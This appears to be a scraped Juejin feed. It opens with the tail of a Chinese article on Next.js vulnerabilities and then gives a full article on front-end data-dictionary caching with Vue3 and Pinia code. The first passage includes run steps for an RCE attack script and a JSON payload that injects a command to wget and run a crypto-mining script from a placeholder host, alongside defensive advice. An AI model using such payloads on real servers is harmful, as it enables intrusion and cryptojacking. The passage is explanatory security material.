   <span class="hljs-keyword">return</span> &gt;<span class="hljs-title class_">Next</span>.<span class="hljs-property">js</span> <span class="hljs-title class_">App</span> <span class="hljs-title class_">Router</span> 测试页;

}
</code></pre>
<h5 data-id="heading-17">运行步骤</h5>
<ol>
<li>
<p>启动测试项目：<code>npm run dev</code></p>
</li>
<li>
<p>运行攻击脚本：<code>node rce-attack.js</code></p>
</li>
<li>
<p>预期结果：</p>
</li>
</ol>
<ul>
<li>
<p>Windows 系统：响应中返回 <code>DESKTOP-XXX\用户名</code></p>
</li>
<li>
<p>Linux/Mac 系统：响应中返回 <code>www-data</code> 或当前用户身份</p>
</li>
<li>
<p>控制台输出 “远程代码执行成功”</p>
</li>
</ul>
<blockquote>
<p>📌 注：真实攻击中，攻击者会将</p>
<p><code>whoami</code></p>
<p>替换为恶意命令，例如：</p>
</blockquote>
<pre><code class="hljs language-json" lang="json">'<span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"invoke"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span>\<span class="hljs-punctuation">[</span><span class="hljs-string">";wget http://恶意地址/挖矿脚本.sh &amp;&amp; chmod +x 挖矿脚本.sh &amp;&amp; ./挖矿脚本.sh;"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">}</span>'
</code></pre>
<p>本示例仅用 <code>whoami</code> 演示原理，切勿用于非法用途。</p>
<hr/>
<h3 data-id="heading-18">三、前端关键提醒</h3>
<ol>
<li>
<p><strong>漏洞本质</strong>：都是 “信任了客户端输入”—— 中间件信了伪造的请求头，服务器信了伪造的 RSC 数据，核心是 “服务端未做严格校验”。</p>
</li>
<li>
<p><strong>修复原则</strong>：框架底层漏洞，前端代码无法直接防御！必须升级 Next.js 到安全版本（这是最根本、最靠谱的方案）。</p>
</li>
<li>
<p><strong>额外防护</strong>：</p>
</li>
</ol>
<ul>
<li>
<p>关键路由（登录、支付、后台）必须加 “双重校验”（中间件 + 接口层 token 验证），不要单靠中间件。</p>
</li>
<li>
<p>自托管项目需在 Nginx/Cloudflare 层拦截恶意请求头（如 <code>x-middleware-subrequest</code>）。</p>
</li>
</ul>
<ol>
<li><strong>日常习惯</strong>：</li>
</ol>
<ul>
<li>
<p>定期执行 <code>npm audit</code> 扫描依赖漏洞，及时更新补丁版本。</p>
</li>
<li>
<p>关键业务优先使用 Vercel 托管（官方自带漏洞防护，自动屏蔽部分攻击）。</p>
</li>
<li>
<p>服务器启用主机安全工具，监控异常进程和文件下载。</p>
</li>
</ul>
<blockquote>
<p>最后感谢阅读！欢迎关注我，微信公众号：<code>《鲫小鱼不正经》</code>。欢迎点赞、收藏、关注，一键三连！！！</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端数据字典技术方案实战]]></title>    <link>https://juejin.cn/post/7581750253000425507</link>    <guid>https://juejin.cn/post/7581750253000425507</guid>    <pubDate>2025-12-10T02:24:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581750253000425507" data-draft-id="7581752787564052520" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端数据字典技术方案实战"/> <meta itemprop="keywords" content="前端,JavaScript,架构"/> <meta itemprop="datePublished" content="2025-12-10T02:24:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="树深遇鹿"/> <meta itemprop="url" content="https://juejin.cn/user/3281394147006381"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端数据字典技术方案实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3281394147006381/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    树深遇鹿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:24:05.000Z" title="Wed Dec 10 2025 02:24:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto;border:3px solid rgba(62,175,124,.2)}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-weight:700;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:6px;border:2px solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c}.markdown-body a:active,.markdown-body a:hover{border-bottom:1.5px solid #3eaf7c}.markdown-body a:before{content:"⇲"}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(62,175,124,.2)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:.5rem solid;border-color:#42b983;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none}.markdown-body ul li:before{content:"•";margin-right:4px;color:#3eaf7c}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在后台与中台系统开发领域，数据字典是极为常见且至关重要的概念，相信大多数从事相关开发工作的朋友都对其耳熟能详。几乎每一个成熟的项目，都会专门设置一个字典模块，用于精心维护各类字典数据。这些字典数据在系统中扮演着举足轻重的角色，为下拉框、转义值、单选按钮等组件提供了不可或缺的基础数据支撑。</p>
<p>我自工作以来参与过很多个项目，既有从零开始搭建的，也有接手他人项目的。在实践过程中，我发现不同项目对字典的实现方式各不相同，且各有侧重。例如，对于项目中的字典基本不会发生变化的，项目通常会采用首次全部加载到本地缓存的方式。这种方式能显著节省网络请求次数，提升系统响应速度。然而，对于项目中的字典经常变动的，项目则会采用按需加载的方式，即哪里需要使用字典值，就在哪里进行加载。但这种方式也存在弊端，当某个页面需要使用十多个字典值时，首次进入页面会一次性发出十多个请求来获取这些字典值，影响用户体验。</p>
<h2 data-id="heading-1">常见字典方案剖析</h2>
<p>在当下，数据字典的实现方案丰富多样，各有优劣。下面将详细介绍几种常见的方案，并分析其特点。我将详细介绍几种常见的方案，并深入剖析其特点。这几种方案皆是我通过实践精心总结而来，其中方案四的思路是由<a href="https://juejin.cn/user/78820570050190" target="_blank" title="https://juejin.cn/user/78820570050190">我不爱吃鱼啦</a>提供。</p>
<h3 data-id="heading-2">方案一：首次全部加载到本地进行缓存</h3>
<h4 data-id="heading-3">方案描述</h4>
<p>系统启动或用户首次访问时，将所有字典数据一次性加载到本地缓存中。后续使用过程中，直接从缓存中获取所需字典数据，无需再次向服务器发起请求。</p>
<h4 data-id="heading-4">优点</h4>
<ul>
<li><strong>访问速度快</strong>：后续访问时直接从本地缓存读取数据，无需等待网络请求，响应速度极快。</li>
<li><strong>减少网络请求</strong>：一次性加载后，后续使用无需频繁发起网络请求，降低了网络开销。</li>
<li><strong>网络依赖小</strong>：即使在网络不稳定的情况下，也能正常使用已缓存的字典数据，保证了系统的稳定性。</li>
</ul>
<h4 data-id="heading-5">缺点</h4>
<ul>
<li><strong>首次加载时间长</strong>：若字典数据量较大，首次加载时可能需要较长时间，影响用户体验。</li>
<li><strong>占用存储空间</strong>：将所有字典数据存储在本地，会占用较多的本地存储空间，尤其是当字典数据量庞大时。</li>
<li><strong>缓存更新复杂</strong>：若字典数据频繁更新，需要设计复杂的缓存同步和更新机制，否则容易出现数据不一致的问题。</li>
</ul>
<h3 data-id="heading-6">方案二：按需加载不缓存</h3>
<h4 data-id="heading-7">方案描述</h4>
<p>当用户触发特定操作，需要使用字典数据时，才从后端实时加载所需数据，且不进行本地缓存。每次使用字典数据时，都重新从服务器获取最新数据。</p>
<h4 data-id="heading-8">优点</h4>
<ul>
<li><strong>节省存储空间</strong>：不进行本地缓存，节省了本地存储空间，尤其适用于存储资源有限的设备。</li>
<li><strong>数据实时性高</strong>：每次获取的数据都是最新的，不存在缓存数据与后端不一致的问题，保证了数据的准确性。</li>
</ul>
<h4 data-id="heading-9">缺点</h4>
<ul>
<li><strong>网络请求频繁</strong>：每次使用都需要发起网络请求，在网络状况不佳时，会导致加载时间变长，影响用户体验。</li>
<li><strong>增加服务器负担</strong>：频繁的网络请求会增加服务器的负担，尤其是在高并发场景下，可能影响服务器的性能。</li>
</ul>
<h3 data-id="heading-10">方案三：首次按需加载并缓存</h3>
<h4 data-id="heading-11">方案描述</h4>
<p>用户首次访问某个字典数据时，从后端加载该数据并缓存到本地。后续再次访问该字典数据时，直接从缓存中读取，无需再次向服务器发起请求。</p>
<h4 data-id="heading-12">优点</h4>
<ul>
<li><strong>减少网络请求</strong>：结合了前两种方案的部分优点，既在一定程度上减少了网络请求次数，又不会一次性加载过多数据。</li>
<li><strong>节省存储空间</strong>：相较于首次全部加载到本地缓存的方式，不会一次性占用大量本地存储空间，节省了部分存储资源。</li>
</ul>
<h4 data-id="heading-13">缺点</h4>
<ul>
<li><strong>缓存管理复杂</strong>：需要记录哪些数据已缓存，以便后续判断是否需要从缓存中读取或重新加载，增加了缓存管理的复杂度。</li>
<li><strong>缓存占用问题</strong>：对于不常使用的字典数据，缓存可能会占用不必要的存储空间，造成资源浪费。</li>
<li><strong>缓存更新难题</strong>：同样面临缓存更新的问题，需要设计合理的缓存更新策略，以保证数据的准确性和一致性。</li>
</ul>
<h3 data-id="heading-14">方案四：按需加载 + 版本校验更新缓存</h3>
<h4 data-id="heading-15">方案描述</h4>
<p>用户按需发起字典数据请求，首次访问某个字典数据时，从后端加载并缓存到本地。在后端响应头中携带该字典数据的版本信息，后续每次请求该字典数据时，前端对比本地缓存的版本信息和响应头中的版本信息。若版本信息不一致，则清除本地缓存中对应的字典数据，并重新从后端加载最新数据；若版本信息一致，则直接使用本地缓存的数据。</p>
<h4 data-id="heading-16">优点</h4>
<ul>
<li><strong>数据实时性有保障</strong>：通过版本校验机制，能够及时获取到字典数据的更新，确保前端使用的数据与后端保持一致，避免了因缓存数据未及时更新而导致的业务问题。</li>
<li><strong>减少不必要的网络请求</strong>：在字典数据未更新时，直接使用本地缓存，无需发起网络请求，节省了网络带宽和服务器资源。</li>
<li><strong>平衡存储与性能</strong>：既不会像首次全部加载那样占用大量本地存储空间，又能在一定程度上减少网络请求，在存储和性能之间取得了较好的平衡。</li>
</ul>
<h4 data-id="heading-17">缺点</h4>
<ul>
<li><strong>版本管理复杂</strong>：后端需要维护字典数据的版本信息，并且要确保版本号的准确性和唯一性，这增加了后端开发的复杂度和维护成本。</li>
<li><strong>额外开销</strong>：每次请求都需要进行版本信息对比操作，虽然开销较小，但在高并发场景下，可能会对系统性能产生一定影响。</li>
<li><strong>首次加载体验</strong>：首次加载字典数据时，依然需要从后端获取数据，若数据量较大或网络状况不佳，可能会影响用户体验。</li>
</ul>
<h3 data-id="heading-18">方案选型建议</h3>
<p>建议根据项目特性选择方案，没有最好的技术方案，只有最适合项目的技术方案：</p>
<ul>
<li><strong>字典稳定且量小</strong>：方案一全量缓存</li>
<li><strong>字典频繁更新</strong>：方案四版本校验缓存</li>
<li><strong>存储敏感场景</strong>：方案三按需缓存</li>
<li><strong>实时性要求极高</strong>：方案二无缓存方案</li>
</ul>
<blockquote>
<p>ps：如果大家有更好的方案，也可以在评论区提出，让我们大家一起学习成长</p>
</blockquote>
<h2 data-id="heading-19">代码实现（方案四）</h2>
<p>下述代码的实现基于vue3+pinia，该代码实现了统一管理全局字典数据，支持按需加载、缓存复用、版本控制、动态更新、批量处理字典数据等功能。</p>
<h3 data-id="heading-20">pinia store的实现</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { defineStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'pinia'</span>
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { getDictDetails, <span class="hljs-keyword">type</span> <span class="hljs-title class_">Details</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/system/dict'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useDictStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'dict'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 存储字典数据，键为字典名称，值为字典详情数组</span>
    <span class="hljs-keyword">const</span> dictData = ref&lt;<span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Details</span>[]&gt;&gt;({})
    <span class="hljs-comment">// 存储字典版本信息，键为字典名称，值为版本号</span>
    <span class="hljs-keyword">const</span> dictVersions = ref&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">''</span>)

    <span class="hljs-comment">/**
     * 更新字典版本信息
     * <span class="hljs-doctag">@param</span> version 新的字典版本号
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">updateDictVersion</span> = (<span class="hljs-params">version: <span class="hljs-built_in">string</span></span>) =&gt; {
        dictVersions.<span class="hljs-property">value</span> = version
    }

    <span class="hljs-comment">/**
     * 获取字典版本
     * <span class="hljs-doctag">@returns</span> 字典版本号
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDictVersion</span> = (<span class="hljs-params"/>) =&gt; {
        <span class="hljs-keyword">return</span> dictVersions.<span class="hljs-property">value</span> || <span class="hljs-string">''</span>
    }

    <span class="hljs-comment">/**
     * 加载字典数据
     * <span class="hljs-doctag">@param</span> dictNames 字典名称数组
     * <span class="hljs-doctag">@returns</span> 加载的字典数据对象
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDicts</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">dictNames: <span class="hljs-built_in">string</span>[]</span>) =&gt; {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(dictNames)) {
                <span class="hljs-keyword">return</span> {};
            }
            <span class="hljs-comment">// 过滤并去重有效字典名称</span>
            <span class="hljs-keyword">const</span> uniqueNames = [...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(dictNames.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> 
                <span class="hljs-keyword">typeof</span> name === <span class="hljs-string">'string'</span> &amp;&amp; name.<span class="hljs-title function_">trim</span>()
            ))];
            
            <span class="hljs-keyword">if</span> (uniqueNames.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> {};
            }

            <span class="hljs-keyword">const</span> <span class="hljs-attr">result</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Details</span>[]&gt; = {};
            <span class="hljs-keyword">const</span> <span class="hljs-attr">unloadedDicts</span>: <span class="hljs-built_in">string</span>[] = [];

            <span class="hljs-comment">// 分离已加载和未加载的字典</span>
            dictNames.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> {
                <span class="hljs-keyword">if</span> (dictData.<span class="hljs-property">value</span>[name]) {
                    result[name] = dictData.<span class="hljs-property">value</span>[name];
                } <span class="hljs-keyword">else</span> {
                    unloadedDicts.<span class="hljs-title function_">push</span>(name);
                }
            });

            <span class="hljs-comment">// 如果有未加载的字典，从接口请求获取</span>
            <span class="hljs-keyword">if</span> (unloadedDicts.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">const</span> { data } = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getDictDetails</span>(unloadedDicts);

                <span class="hljs-comment">// 合并新加载的数据到结果</span>
                <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(result, data);

                <span class="hljs-comment">// 更新全局字典缓存</span>
                <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(dictData.<span class="hljs-property">value</span>, data);
            }

            <span class="hljs-keyword">return</span> result;
        } <span class="hljs-keyword">catch</span> (error) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'加载字典数据失败:'</span>, error);
            <span class="hljs-keyword">return</span> {};
        }
    };

    <span class="hljs-comment">/**
     * 根据字典名称获取字典数据
     * <span class="hljs-doctag">@param</span> name 字典名称
     * <span class="hljs-doctag">@returns</span> 字典详情数组
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDict</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) =&gt; {
        <span class="hljs-keyword">return</span> dictData.<span class="hljs-property">value</span>[name] || []
    }

    <span class="hljs-comment">/**
     * 根据字典名称和值获取字典标签
     * <span class="hljs-doctag">@param</span> name 字典名称
     * <span class="hljs-doctag">@param</span> value 字典值
     * <span class="hljs-doctag">@returns</span> 字典标签
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDictLabel</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span>, value: <span class="hljs-built_in">string</span></span>) =&gt; {
        <span class="hljs-keyword">const</span> dict = <span class="hljs-title function_">getDict</span>(name)
        <span class="hljs-keyword">const</span> item = dict.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">value</span> === value)
        <span class="hljs-keyword">return</span> item?.<span class="hljs-property">label</span> || <span class="hljs-string">''</span>
    }

    <span class="hljs-comment">/**
     * 根据字典名称和标签获取字典值
     * <span class="hljs-doctag">@param</span> name 字典名称
     * <span class="hljs-doctag">@param</span> label 字典标签
     * <span class="hljs-doctag">@returns</span> 字典值
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDictValue</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span>, label: <span class="hljs-built_in">string</span></span>) =&gt; {
        <span class="hljs-keyword">const</span> dict = <span class="hljs-title function_">getDict</span>(name)
        <span class="hljs-keyword">const</span> item = dict.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">label</span> === label)
        <span class="hljs-keyword">return</span> item?.<span class="hljs-property">value</span> || <span class="hljs-string">''</span>
    }

    <span class="hljs-comment">/**
     * 清除指定字典数据
     * <span class="hljs-doctag">@param</span> names 字典名称
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">clearDicts</span> = (<span class="hljs-params">names: <span class="hljs-built_in">string</span>[]</span>) =&gt; {
        names.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> {
            <span class="hljs-title function_">clearDict</span>(name)
        })
    }


    <span class="hljs-comment">/**
     * 清除指定字典数据
     * <span class="hljs-doctag">@param</span> name 字典名称
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">clearDict</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) =&gt; {
        <span class="hljs-keyword">delete</span> dictData.<span class="hljs-property">value</span>[name]
    }

    <span class="hljs-comment">/**
     * 清除所有字典数据
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">clearAllDict</span> = (<span class="hljs-params"/>) =&gt; {
        dictData.<span class="hljs-property">value</span> = {}
    }

    <span class="hljs-keyword">return</span> {
        dictData,
        updateDictVersion,
        getDictVersion,
        getDict,
        getDicts,
        getDictLabel,
        getDictValue,
        clearDict,
        clearDicts,
        clearAllDict
    }
})
</code></pre>
<h3 data-id="heading-21">useDict 实现</h3>
<p>为组件提供<strong>字典数据的统一访问入口</strong>，封装了字典数据的初始化加载、详情查询、标签/值转换等高频操作，简化组件层对字典数据的调用逻辑。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-keyword">type</span> <span class="hljs-title class_">Details</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/system/dict'</span>
<span class="hljs-keyword">import</span> { useDictStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/store/dict'</span>

<span class="hljs-comment">// 根据字典值的name获取字典详情</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useDict</span> = (<span class="hljs-params">params: <span class="hljs-built_in">string</span>[] = []</span>) =&gt; {

  <span class="hljs-keyword">const</span> dict = ref&lt;<span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Details</span>[]&gt;&gt;()
  <span class="hljs-keyword">const</span> dictStore = <span class="hljs-title function_">useDictStore</span>()

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDicts</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    dict.<span class="hljs-property">value</span> = <span class="hljs-keyword">await</span> dictStore.<span class="hljs-title function_">getDicts</span>(params)
  }

  <span class="hljs-comment">// 初始化字典数据</span>
  <span class="hljs-title function_">getDicts</span>()

  <span class="hljs-comment">// 根据字典名称获取字典数据</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDict</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) =&gt; {
    <span class="hljs-keyword">return</span> dictStore.<span class="hljs-title function_">getDict</span>(name)
  }

  <span class="hljs-comment">// 根据字典值获取字典label</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDictLabel</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span>, value: <span class="hljs-built_in">string</span></span>) =&gt; {
    <span class="hljs-keyword">return</span> dictStore.<span class="hljs-title function_">getDictLabel</span>(name, value)
  }

  <span class="hljs-keyword">return</span> {
    dict,
    getDict,
    getDictLabel
  }
}
</code></pre>
<h3 data-id="heading-22">响应拦截</h3>
<p>主要用于获取字典的版本信息，通过对比版本信息，从而确定是否清除本地的字典缓存数据，并更新本地缓存的版本信息</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 响应拦截器</span>
service.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-comment">// AxiosResponse</span>
  <span class="hljs-function">(<span class="hljs-params">response: AxiosResponse</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> dictVersion = response.<span class="hljs-property">headers</span>[<span class="hljs-string">'x-dictionary-version'</span>]
    <span class="hljs-keyword">if</span> (dictVersion) {
      <span class="hljs-keyword">const</span> dictStore = <span class="hljs-title function_">useDictStore</span>()
      <span class="hljs-comment">// 对比版本是否有更新</span>
      <span class="hljs-keyword">if</span> (dictStore.<span class="hljs-title function_">getDictVersion</span>() !== dictVersion) {
        dictStore.<span class="hljs-title function_">clearAllDict</span>()
        dictStore.<span class="hljs-title function_">updateDictVersion</span>(dictVersion || <span class="hljs-string">''</span>)
      }
    }
    <span class="hljs-comment">// ...项目中的业务逻辑</span>
  }
)
</code></pre>
<h3 data-id="heading-23">项目中的具体使用</h3>
<p>下述的怎么使用封装的字典管理的简单demo</p>
<pre><code class="hljs language-ts" lang="ts">&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">import</span> { useDict } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/hooks/useDict'</span>
<span class="hljs-comment">// 获取dict</span>
<span class="hljs-keyword">const</span> { dict, getDictLabel } =  <span class="hljs-title function_">useDict</span>([<span class="hljs-string">'status'</span>, <span class="hljs-string">'sex'</span>])
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dict.<span class="hljs-property">status</span>, dict.<span class="hljs-property">sex</span>)
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-24">项目源码地址</h3>
<p>nest后端</p>
